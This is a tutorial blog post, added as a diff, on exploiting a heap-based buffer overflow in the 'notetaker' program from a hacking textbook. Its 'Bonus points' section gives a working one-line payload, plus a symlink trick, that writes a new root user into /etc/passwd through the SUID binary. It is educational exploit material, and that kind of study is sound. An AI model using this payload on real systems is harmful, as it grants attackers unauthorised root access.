@@ -1,0 +1,160 @@
+#+title: Heap-based buffer overflows
+#+hugo_publishdate: 2023-11-19
+#+options: tags:nil
+
+* Table of Contents                                               :TOC_5_org:
+- [[Introduction][Introduction]]
+- [[Stack vs Heap-based buffer overflows?][Stack vs Heap-based buffer overflows?]]
+- [[System information][System information]]
+- [[Exercise][Exercise]]
+- [[Bonus points][Bonus points]]
+- [[Conclusion][Conclusion]]
+
+* Introduction
+
+In a previous post, I explained what a [[https://danielorihuela.github.io/posts/stack-based-buffer-overflows/][stack-based buffer overflow]] is and how it works. Today, we are going to see the heap-based variant.
+
+* Stack vs Heap-based buffer overflows?
+
+The difference between those two types is the region of memory where the exploited variables reside. That's easy to see in the C language. All variables are stored in the stack unless we use functions to allocate memory in the heap.
+
+#+begin_src C
+  # Variables stored in the stack
+  int auth_flag = 0;
+  char password_buffer[16];
+
+  # Variables stored in the heap
+  buffer = (char *)ec_malloc(100);
+#+end_src
+
+* System information
+
+Before starting, let me mention some information about my system. Take them into account if you try to replicate the results. They may vary from machine to machine.
+
+- Linux 5.15.0-86-generic x86_64
+- Intel(R) Core(TM) i7-10510U CPU
+- Little Endian
+- 48 bits address size
+
+* Exercise
+
+We are going to exploit the ~notetaker.c~ program from *Hacking: The Art of Exploitation, 2nd Edition*. You can get the source code at https://github.com/intere/hacking/blob/master/booksrc. The program creates notes in =/var/notes=. Creating and modifying files in the root path requires root permissions. Hence, the executable of this program must be owned by the root and have the SUID activated. That way, we can execute it with normal users as if they were root.
+
+#+begin_src C
+  #include <stdio.h>
+  #include <stdlib.h>
+  #include <string.h>
+  #include <fcntl.h>
+  #include <sys/stat.h>
+  #include "hacking.h"
+
+  void usage(char *prog_name, char *filename)
+  {
+    printf("Usage: %s <data to add to %s>\n", prog_name, filename);
+    exit(0);
+  }
+
+  void fatal(char *);            // A function for fatal errors
+  void *ec_malloc(unsigned int); // An error-checked malloc() wrapper
+
+  int main(int argc, char *argv[])
+  {
+    int userid, fd; // File descriptor
+    char *buffer, *datafile;
+
+    buffer = (char *)ec_malloc(100);
+    datafile = (char *)ec_malloc(20);
+    strcpy(datafile, "/var/notes");
+
+    if (argc < 2)                 // If there aren't command-line arguments,
+      usage(argv[0], datafile); // display usage message and exit.
+
+    strcpy(buffer, argv[1]); // Copy into buffer.
+
+    printf("[DEBUG] buffer @ %p: \'%s\'\n", buffer, buffer);
+    printf("[DEBUG] datafile @ %p: \'%s\'\n", datafile, datafile);
+
+    // Opening the file
+    fd = open(datafile, O_WRONLY | O_CREAT | O_APPEND, S_IRUSR | S_IWUSR);
+    if (fd == -1)
+      fatal("in main() while opening file");
+    printf("[DEBUG] file descriptor is %d\n", fd);
+
+    userid = getuid(); // Get the real user ID.
+
+    // Writing data
+    if (write(fd, &userid, 4) == -1) // Write user ID before note data.
+      fatal("in main() while writing userid to file");
+    write(fd, "\n", 1);                          // Terminate line.
+    if (write(fd, buffer, strlen(buffer)) == -1) // Write note.
+      fatal("in main() while writing buffer to file");
+
+    write(fd, "\n", 1); // Terminate line.
+    // Closing file
+    if (close(fd) == -1)
+      fatal("in main() while closing file");
+    printf("Note has been saved.\n");
+    free(buffer);
+    free(datafile);
+  }
+#+end_src
+
+The error is copying the data from ~argv[1]~ to the buffer without checking the length. We can overflow the ~buffer~ variable if we pass a long enough argument to the executable and overwrite the ~datafile~ data.
+
+#+begin_src C
+  buffer = (char *)ec_malloc(100);
+  datafile = (char *)ec_malloc(20);
+  strcpy(datafile, "/var/notes");
+
+  if (argc < 2)                 // If there aren't command-line arguments,
+    usage(argv[0], datafile); // display usage message and exit.
+
+  strcpy(buffer, argv[1]); // Copy into buffer.
+#+end_src
+
+Let's compile the program and give it the proper permissions.
+
+#+begin_src bash
+  gcc notetaker.c -o notetaker -g
+  sudo chown root:root notetaker
+  sudo chmod u+s notetaker
+#+end_src
+
+We can write to whatever file we want, ~testfile~ for example.
+
+#+attr_html: :class centered-image
+[[/images/heap-based-buffer-overflow/create-testfile.png]]
+
+We exploited it!
+
+* Bonus points 
+
+The exercise is helpful but dull. We can do something more interesting when exploiting that program. We can create a new root user with any password that we want. Let me show you.
+
+In Linux, there’s the /etc/passwd file where the basic information related to users is stored. Each entry includes the login name, hashed password, user id, group id, username, home directory and login shell of a user, separated by colons (e.g. ~root:x:0:0:root:/root:/bin/bash~). We can add a manually prepared entry to ~/etc/passwd~,  but how do we create the hashed password?
+
+There are plenty of hashing functions. There's no constraint in linux, so we can use whichever one we want. I decided to use ~crypt~ from perl with a simple password (1234) and salt (AA).
+
+#+begin_src bash
+  perl -e 'print crypt("1234", "AA"), "\n"'
+#+end_src
+
+The result is ~AA3BKXQMdIWHE~. The entry would then look like ~newrootuser:AA3BKXQMdIWHE:0:0:root:/root:/bin/bash~. There's still another problem to solve. Remember that for the exploit to work, the final part of the argument must be the file where we want to write the data. It should be something similar to ~newrootuser:AA3BKXQMdIWHE:0:0:root:/root:/etc/passwd~. However, this is not a valid entry. The last part is no longer a shell, but a file. We can sidestep this problem with a symbolic link. That's the cool part, pay attention.
+
+#+begin_src bash
+  mkdir /tmp/etc
+  ln -s /bin/bash /tmp/etc/passwd
+#+end_src
+
+We just created a symbolic link in ~/tmp/etc/passwd~ to a shell. That way, we can create a payload that ends with a login shell and the filename we want to overwrite. Pretty slick, right? We can then rewrite the entry as ~newrootuser:AA3BKXQMdIWHE:0:0:root:/root:/tmp/etc/passwd~. The last step is to make it longer to overflow the buffer.
+
+#+begin_src bash
+  ./notetaker $(perl -e 'print "newrootuser:AA3BKXQMdIWHE:0:0:", "A" x 71, ":/root:/tmp/etc/passwd"')
+#+end_src
+
+#+attr_html: :class centered-image
+[[/images/heap-based-buffer-overflow/root-access.png]]
+
+* Conclusion
+
+Exploiting heap and stack buffer overflows has the same difficulty. Everything we know about one variant can be applied to the other (as far as I know). They are easy to exploit and protect. However, software engineers should be aware of their existence and how to avoid them. There is no excuse for avoiding them in your programs!
